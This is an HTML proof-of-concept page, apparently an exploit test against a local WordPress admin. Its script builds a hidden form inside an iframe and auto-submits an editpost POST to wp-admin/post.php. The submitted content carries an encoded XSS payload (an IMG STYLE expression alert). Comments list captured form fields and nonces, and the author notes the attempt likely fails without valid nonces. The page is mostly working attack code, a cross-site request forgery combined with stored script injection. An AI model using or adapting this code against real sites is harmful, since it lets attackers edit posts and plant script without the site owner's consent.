<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3. org/TR/html4/loose.dtd">
<HTML>
  
<HEAD>
<TITLE>CVE-xxxx</TITLE>
</HEAD>

  <script type="text/javascript">
    function redirect() {
      <!-- document.location = "http://localhost:8888";  -->
    }
  </script>

<BODY onload="redirect()">

  <!-- <iframe id="frame" style="display:none;"></iframe> -->
  <iframe id="frame" height=1000 width="100%"></iframe>
  
  <script type="text/javascript">
    
  function post_to_url(path, params, method) {
    method = method || "post";

    var mediawiki = document.getElementById("frame").contentDocument;

    var form = mediawiki.createElement("form");
    form.setAttribute("method", method);
    form.setAttribute("action", path);

    for(var key in params) {
        var hiddenField = mediawiki.createElement("input");
        hiddenField.setAttribute("type", "hidden");
        hiddenField.setAttribute("name", key);
        hiddenField.setAttribute("value", params[key]);

        form.appendChild(hiddenField);
    }

    mediawiki.body.appendChild(form);

    form.submit();
  }

  <!-- from exploits -->
  <!-- _wpnonce=aad1243dc1 -->
  <!-- _wp_http_referer=%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D145%26action%3Dedit%26message%3D1 -->
  <!-- user_ID=3 -->
  <!-- action=editpost -->
  <!-- originalaction=editpost -->
  <!-- post_author=3 -->
  <!-- post_type=post -->
  <!-- original_post_status=publish -->
  <!-- referredby=http%3A%2F%2F127.0.0.1%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D145%26action%3Dedit%26message%3D1 -->
  <!-- _wp_original_http_referer=http%3A%2F%2F127.0.0.1%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D145%26action%3Dedit%26message%3D1 -->
  <!-- post_ID=145 -->
  <!-- autosavenonce=e35a537141 -->
  <!-- meta-box-order-nonce=718e35f130 -->
  <!-- closedpostboxesnonce=0203f58029 -->
  <!-- wp-preview= -->
  <!-- hidden_post_status=publish -->
  <!-- post_status=publish -->
  <!-- hidden_post_password= -->
  <!-- hidden_post_visibility=public -->
  <!-- visibility=public -->
  <!-- post_password= -->
  <!-- mm=12 -->
  <!-- jj=27 -->
  <!-- aa=2010 -->
  <!-- hh=15 -->
  <!-- mn=31 -->
  <!-- ss=55 -->
  <!-- hidden_mm=12 -->
  <!-- cur_mm=12 -->
  <!-- hidden_jj=27 -->
  <!-- cur_jj=27 -->
  <!-- hidden_aa=2010 -->
  <!-- cur_aa=2010 -->
  <!-- hidden_hh=15 -->
  <!-- cur_hh=16 -->
  <!-- hidden_mn=31 -->
  <!-- cur_mn=02 -->
  <!-- original_publish=Update -->
  <!-- save=Update -->
  <!-- post_category%5B%5D=0 -->
  <!-- post_category%5B%5D=1 -->
  <!-- tax_input%5Bpost_tag%5D= -->
  <!-- newtag%5Bpost_tag%5D= -->
  <!-- post_title= -->
  <!-- samplepermalinknonce=ffcbf222eb -->
  <!-- content=%3CIMG+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E -->
  <!-- excerpt= -->
  <!-- trackback_url= -->
  <!-- meta%5B108%5D%5Bkey%5D=_edit_last -->
  <!-- _ajax_nonce=257f6f6ad9 -->
  <!-- meta%5B108%5D%5Bvalue%5D=3 -->
  <!-- meta%5B111%5D%5Bkey%5D=_edit_lock -->
  <!-- _ajax_nonce=257f6f6ad9 -->
  <!-- meta%5B111%5D%5Bvalue%5D=1293465765 -->
  <!-- meta%5B116%5D%5Bkey%5D=_encloseme -->
  <!-- _ajax_nonce=257f6f6ad9 -->
  <!-- meta%5B116%5D%5Bvalue%5D=1 -->
  <!-- meta%5B110%5D%5Bkey%5D=_wp_old_slug -->
  <!-- _ajax_nonce=257f6f6ad9 -->
  <!-- meta%5B110%5D%5Bvalue%5D= -->
  <!-- metakeyselect=%23NONE%23 -->
  <!-- metakeyinput= -->
  <!-- metavalue= -->
  <!-- _ajax_nonce-add-meta=61de41e725 -->
  <!-- advanced_view=1 -->
  <!-- comment_status=open -->
  <!-- ping_status=open -->
  <!-- add_comment_nonce=c32341570f -->
  <!-- post_name=145 -->

  <!-- I don't think it is bug - need wpnonce & meta-box-order-nonce -->
  post_to_url( "http://localhost:8888/wp-admin/post.php",
              { "post"          : 1,
                "_wpnonce"      : "fd4e56c5d8",
                "user_ID"       : 1,
                "action"        : "editpost",
                "originalaction": "editpost",
                "post_author"   : 1,
                "post_type"     : "post",
                "post_ID"       : 1,
                "save"          : "Update",
                "content"       : "%3CIMG+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E",
                "original_publish"      : "Update",
                "original_post_status"  :"publish",
                "meta-box-order-nonce"  :"f9841b40af",
              },
              "POST" );
</script>

</BODY>
</HTML>
